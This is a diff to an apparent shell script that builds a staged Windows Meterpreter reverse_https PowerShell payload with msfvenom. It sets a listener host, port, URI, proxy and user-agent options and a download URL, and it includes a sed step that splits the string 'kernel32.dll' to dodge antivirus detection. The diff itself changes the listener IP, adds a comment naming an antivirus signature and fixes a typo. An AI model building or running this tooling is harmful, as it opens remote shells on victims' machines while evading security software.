@@ -6,9 +6,9 @@
 # payload options for staged msfvenom -p windows/x64/meterpreter/reverse_https --list-options
 payload="windows/x64/meterpreter/reverse_https"
 #payload="windows/x64/meterpreter/reverse_winhttps"
-ListenerIP=10.0.8.4
+ListenerIP=192.168.88.19
 ListenerPort=443
-ListenerURI="/logout"
+ListenerURI="/logout/"
 ProxyType=HTTP
 #HttpProxyIE=true
 ProxyHost=""
@@ -19,12 +19,13 @@ UserAgent="'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Geck
 DownloadURL="http://10.0.8.4:8080"
 
 # payload options one liner
+# reverse_https
 payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpProxyType=$ProxyType HttpProxyHost=$ProxyHost HttpProxyPort=$ProxyPort HttpProxyUser=$ProxyUser HttpProxyPass=$ProxyPass HttpUserAgent=$UserAgent"
 printf "Payload and options used:\n$payload\n$payload_options\n...\n"
 
 # generate payload
 raw_payload="msfvenom -p $payload $payload_options -f psh-net -o raw_pshnet_revhttps.ps1"
-printf "Generating staget with msfvenom:\n$raw_payload\n...\n"
+printf "Generating staged with msfvenom:\n$raw_payload\n...\n"
 $raw_payload
 
 # raw payload usage
@@ -114,6 +115,7 @@ do
 done
 
 # do kernel32.dll things to avoid detection
+#ISB.Downloader!gen245
 sed -i 's,kernel32.dll,ke"+"rn"+"e"+"l"+"32."+"d"+"l"+"l,g' final_pshnet_revhttps.ps1
 
 printf "Final psh-net usage example:\n"
